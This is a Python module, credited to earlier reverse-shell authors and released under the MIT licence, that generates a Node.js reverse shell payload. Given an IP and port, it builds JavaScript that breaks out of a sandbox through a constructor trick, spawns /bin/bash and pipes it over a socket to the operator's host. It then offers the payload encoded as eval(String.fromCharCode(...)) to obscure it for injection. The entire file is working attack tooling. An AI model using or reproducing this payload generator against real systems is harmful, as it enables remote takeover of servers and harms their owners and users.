#################################################################################
# Based on the NodeJS reverse shell by Evilpacket                               #
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js        #
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)  #
# Insecurety Research (2013) - insecurety.net                                   #
# Updated as an importable python module by Andrew Trube                        #
#                                                                               #
# Copyright (c) 2021 Andrew Trube  <trube510@protonmail.com>                    #
#                                                                               #
# Permission is hereby granted, free of charge, to any person obtaining a copy  #
# of this software and associated documentation files (the "Software"), to deal #
# in the Software without restriction, including without limitation the rights  #
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell     #
# copies of the Software, and to permit persons to whom the Software is         #
# furnished to do so, subject to the following conditions:                      #
#                                                                               #
# The above copyright notice and this permission notice shall be included in all#
# copies or substantial portions of the Software.                               #
#                                                                               #                                              
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR    #
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,      #
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   #
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER        #
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, #
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE #
# SOFTWARE.                                                                     #
#                                                                               #
#################################################################################


class nodeRevShell:
  def __init__(self,IP,PORT):
    """
    Instantiate the class with a stringified IP and a PORT number, ex:

    from nodeshell import nodeRevShell
    rsh = nodeRevShell('127.0.0.1',53)
    """
    self.IP_ADDR = IP
    self.PORT = PORT

    print("[+] LHOST = {}".format(self.IP_ADDR))
    print( "[+] LPORT = {}".format(self.PORT))

    #This probably won't work in a sanbox in that case change the payload with update_shell()
    self.shell = '''
var p = parts.constructor.constructor('return process')();
var require = p.mainModule.require;
var net = require('net'); 
var child_process = require('child_process'); 
sh = child_process.exec('/bin/bash');
client = new net.Socket();
client.connect(%s, '%s', function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});
    ''' % (self.PORT, self.IP_ADDR)

  def generate_shell(self):
    """Returns an array with the first item the actual payload and the second item being the encoded String.CharCode nodejs reverse shell"""
    string = self.shell
    encoded = ''
    for char in string:
      encoded += ',{}'.format(str(ord(char)))
    self.encoded = encoded[1:]
    return ["eval(String.fromCharCode({}))".format(self.encoded), self.encoded]
    
  def print_shell(self):
    """ Prints the nodejs reverse shell w/o encoding """
    print(self.shell)
    return 0
    
  def update_shell(self, new_payload):
    """ changes the payload (the reverse shell in self.shell) to the string provided in new_payload """
    self.shell = new_payload
    return 0
    
